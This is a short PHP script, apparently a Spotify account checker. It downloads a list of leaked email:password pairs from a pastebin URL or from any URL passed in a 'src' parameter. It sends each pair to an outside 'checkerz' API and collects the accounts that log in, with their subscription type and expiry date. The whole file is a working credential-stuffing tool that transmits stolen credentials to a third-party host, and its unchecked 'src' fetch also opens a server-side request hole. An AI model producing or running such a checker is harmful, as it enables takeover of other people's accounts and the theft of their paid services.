<?php
	$url = (isset($_GET['src']) ? $_GET['src'] : 'https://pastebin.com/raw/Wj8m8hgy');

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$data = curl_exec($ch);
	curl_close($ch);

	preg_match_all("/[a-zA-Z0-9\.]*@[a-zA-Z0-9\.:]*/m", $data, $hasil);

	$data = $hasil[0];
	for ($i=1; $i < count($data) ; $i+=2) { 
		$array = explode(":", $data[$i]);
		$parse['email'] = $array[0];
		$parse['pass'] = $array[1];
		$akun[] = $parse;
	}	
	
	foreach ($akun as $data) {
		$email = $data['email'];
		$pass = $data['pass'];
		$url = "https://checkerz.altervista.org/spotify/api/index.php?u=$email&p=$pass";

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$html = curl_exec($ch);

		curl_close($ch);
		$check = json_decode($html);

		echo "<pre>";
		var_dump($check);
		
		if ($check->status == "success") {
			@$val["user"] = $email;
			@$val["pass"] = $pass;
			@$val["berlaku"] = $check->Berlaku[0];
			@$val["jenis"] = $check->subscription;
			$output[] = $val;
		}
	}

	echo json_encode($output);
?>